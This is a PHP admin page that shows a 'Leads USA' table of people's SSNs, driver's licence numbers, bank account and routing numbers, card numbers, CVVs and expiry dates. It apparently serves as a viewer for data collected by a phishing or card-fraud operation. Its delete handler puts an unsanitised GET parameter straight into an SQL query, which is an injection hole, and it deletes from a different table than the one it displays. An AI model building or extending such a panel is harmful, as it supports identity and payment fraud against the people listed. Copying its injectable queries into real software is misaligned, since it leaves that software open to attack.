<?php
require 'class/connection.php';
connect();


$msg = "";
if(isset($_GET['did']))
{
    
   
    
    $did = $_GET['did'];
    
  $dq =   mysqli_query($GLOBALS["___mysqli_ston"], "delete from registration where uid = $did ") or die(((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)));
    
  if($dq)
  {
      $msg = "   <div class='success'>Row Delete </div>";
  }
}




?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>

        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

        <title></title>
        <?php
        include 'include_theme/head_scripts.php';
        ?>
         <script type="text/javascript">// <![CDATA[
function confirmDelete(delUrl) {
    if (confirm("Are you sure you want to delete")) {
        document.location = delUrl;
        
     
    }
}
</script>
    </head>

    <body>  
        <?php
        include 'include_theme/top_menu.php';
        ?>

        <div class="main">

            <div class="container_1" style="overflow: scroll">

                <div class="grid_1">


                    <?php
                    include 'include_theme/welcome.php';

                    ?>
                    <!--/sidebar-->

                    <div class="grid_9 content omega">

                        <div class="content-box">

                            <div class="content-header">

                                <h3>Leads USA</h3>

                            </div>






                            <?php
                            echo $msg;
                            ?>

                            
                            <div style="overflow-x: scroll;">
                                    <table>
                                        <th>Action</th>
                                        <th>ID</th>
                                        <th>firstname</th>
                                        <th>lastname</th>
                                        <th>email</th>
                                        <th>address</th>
                                        <th>city</th>
                                        <th>state</th>
                                        <th>zip</th>
                                        <th>dob</th>
                                        <th>homephone</th>
                                        <th>workphone</th>
                                        <th>ssn</th>
                                        <th>dlno</th>
                                        <th>dlstate</th>
                                        <th>employmentstatus</th>
                                        <th>empname</th>
                                        <th>incometype</th>
                                        <th>income</th>
                                        <th>payperiod</th>
                                        <th>empyears</th>
                                        <th>empmonths</th>
                                        <th>resyears</th>
                                        <th>resmonths</th>
                                        <th>ipaddress</th>
                                        <th>bankname</th>
                                        <th>accountno</th>
                                        <th>routingno</th>
                                        <th>credit_debit_card_no</th>
                                        <th>cvv</th>
                                        <th>expirydate</th>
                                        
                                        
                                        
                                        
                                        
                                        <?php
                                        $users = "select * from leads_usa";
                                        $a = mysqli_query($GLOBALS["___mysqli_ston"], $users);

                                        ?>
                                        <tr>
                                            <?php
                                            while ($data = mysqli_fetch_row($a))
                                            {
                                            ?>
                                            <td><a href=javascript:confirmDelete('users.php?did=<?php echo $data[0];?>')><img src="images/DeleteRed.png" width="20" height="20"/></a></td> 
                                            <td><?php echo $data[0]?></td>
                                            <td><?php echo $data[1]?></td>
                                            <td><?php echo $data[2]?></td>
                                            <td><?php echo $data[3]?></td>
                                            <td><?php echo $data[4]?></td>
                                            <td><?php echo $data[5]?></td>
                                            <td><?php echo $data[6]?></td>
                                            <td><?php echo $data[7]?></td>
                                            <td><?php echo $data[8]?></td>
                                            <td><?php echo $data[9]?></td>
                                            <td><?php echo $data[10]?></td>
                                            <td><?php echo $data[11]?></td>
                                            <td><?php echo $data[12]?></td>
                                            <td><?php echo $data[13]?></td>
                                            <td><?php echo $data[14]?></td>
                                            <td><?php echo $data[15]?></td>
                                            <td><?php echo $data[16]?></td>
                                            <td><?php echo $data[17]?></td>
                                            <td><?php echo $data[18]?></td>
                                            <td><?php echo $data[19]?></td>
                                            <td><?php echo $data[20]?></td>
                                            <td><?php echo $data[21]?></td>
                                            <td><?php echo $data[22]?></td>
                                            <td><?php echo $data[23]?></td>
                                            <td><?php echo $data[24]?></td>
                                            <td><?php echo $data[25]?></td>
                                            <td><?php echo $data[26]?></td>
                                            <td><?php echo $data[27]?></td>
                                            <td><?php echo $data[28]?></td>
                                            <td><?php echo $data[29]?></td>
                                            
                                            
                                        
                                        </tr>
                                      <?php } ?>
                                    </table>                              

                                        
                                </div>
                            



                        </div><!--/content-box-->

                    </div><!--/content-->

                </div><!--/grid-12-->

                <div class="clear"></div>

            </div><!--/container-->

        </div><!--/main-->


        <?php
        include 'include_theme/footer.php';
        ?>

    </body>
</html>